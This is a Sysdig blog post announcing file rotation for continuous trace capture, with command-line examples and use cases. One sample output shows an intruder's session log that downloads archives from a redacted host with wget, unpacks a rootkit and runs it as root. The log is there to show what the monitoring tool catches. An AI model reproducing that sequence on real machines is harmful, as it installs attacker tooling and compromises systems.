---
ID: 1970
post_title: >
  Sysdig Continuous Capture with File
  Rotation
author: Loris Degioanni
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/sysdig-continuous-capture-with-file-rotation/
published: true
post_date: 2015-08-06 07:00:46
---
I’m excited to announce that, with <a href="http://sysdig.org" target="_blank">sysdig</a> version 0.1.102, we have released full support for one of our most commonly requested features: **file rotation for continuous capture**. 

In a nutshell, file rotation lets you automatically split sysdig traces into multiple files, and rotate these files, so that your capture doesn’t grow unbounded. If you are a tcpdump user, then this feature should look very familiar to you. 

File rotation is most useful for monitoring, troubleshooting, and post mortem analysis scenarios that require continuous capture. Given the depth and breadth of data collected by sysdig, continuous capture can quickly generate massive trace files (massive!). With file rotation, you can create simple policies that define how your trace is broken into subfiles, and how these subfiles are retained before being written over. This way, you can easily limit the disk space required for continuous capture scenarios. This effect is amplified when you mix in sysdig filters, which limit the data collected to whatever subset might be most relevant for you. 

## The Basics

Let’s start with some basic examples. 

The -C command line flag lets you split a capture into files of a specific size. For example, use this to generate files that are 1MB in size: 

<pre>> sudo sysdig -C 1 -w dump.scap</pre>

You can combine the -C flag with the -W one to tell sysdig how many files to keep. For example, this command line captures events into files that are 1MB in size, and keeps only the last 5 files on disk: 

<pre>> sudo sysdig -C 1 -W 5 -w dump.scap</pre>

You can use the -G flag as an alternative to -C, to specify a timespan instead of a file size. For example, this command line captures events into files that contain 1 minute of system activity, and keeps the last 5 minutes: 

<pre>> sudo sysdig -G 60 -W 5 -w dump.scap</pre>

Finally, you can use the -e flag if you want to include a specific number of events in each file. This command line for example saves the events into files that contain 1000 events each, and keeps only the last 5 files on disk: 

<pre>> sudo sysdig -e 1000 -W 5 -w dump.scap</pre>

## More Advanced Examples

Use case 1: your application crashes at random points in time, and when that happens you would like to see its last 10 minutes of activity. You can accomplish that with: 

<pre>> sudo sysdig -G 60 -W 10 -wdump.scap proc.name=myapp</pre>

Use case 2: You want to capture all of the commands executed in a container in the last 24 hours. Here’s how you do it: 

<pre>> sudo sysdig -G 86400 -W 1 -w dump.scap evt.type=execve or evt.type=clone and container.name=mycontainer
</pre>

The generated file is going to be very small because only the relevant system calls for the given container are going to be captured. You will be able to inspect the generated file with: 

<pre>> sysdig -r “dump.scap0” -c spy_users
</pre>

<a href="https://sysdigrp2rs.wpengine.com/fishing-for-hackers/" target="_blank">and get an output like</a>: 

<pre>5459 19:42:15 root) cd /usr/sbin
5459 19:42:15 root) mkdir .shm
5459 19:42:17 root) cd /usr/sbin/.shm
5459 19:42:18 root) wget XXX/l.tgz
5459 19:42:20 root) tar zxvf l.tgz
5459 19:42:20 root) gzip -d
5459 19:44:40 root) ps -x
5459 19:44:47 root) w
5459 19:44:50 root) passwd
5459 19:46:21 root) cd /usr/sbin
5459 19:46:21 root) wget XXX/rk.tar
5459 19:46:24 root) tar xvf rk.tar
5459 19:46:24 root) rm -rf rk.tar
5459 19:46:24 root) cd /usr/sbin/rk
5459 19:46:24 root) /bin/bash ./root exampleabcdef 1157
</pre>

Use case 3: you want to capture the last 10 minutes of output on a given logfile: 

<pre>> sudo sysdig -G 600 -W 1 -w dump.scap evt.is_io_write=true and fd.name contains mylogfile
</pre>

You will be able to inspect the generated file with: 

<pre>> sysdig -r dump.scap0 -c echo_fds
</pre>

## One more thing

One last nice feature worth mentioning: file rotation works when consuming events from a trace file as well. This is very handy because it lets you split bigger trace files into smaller ones based on your favorite criteria. 

For example, this command line takes the dump.scap file and breaks it into 5 minute long files. 

<pre>> sysdig -r dump.scap -G 300 -z -w segments.scap
</pre>

## Conclusion

File rotation is a little swiss army knife that, hopefully, will make your sysdig experience even more productive. I’m sure there are many more use cases beyond the basic ones here, and I can’t wait to see what you come up with. I’d love to hear your thoughts in the comments below, on <a href="https://github.com/draios/sysdig" target="_blank">github</a> or on <a href="https://twitter.com/sysdig" target="_blank">twitter</a>. Thanks, happy digging!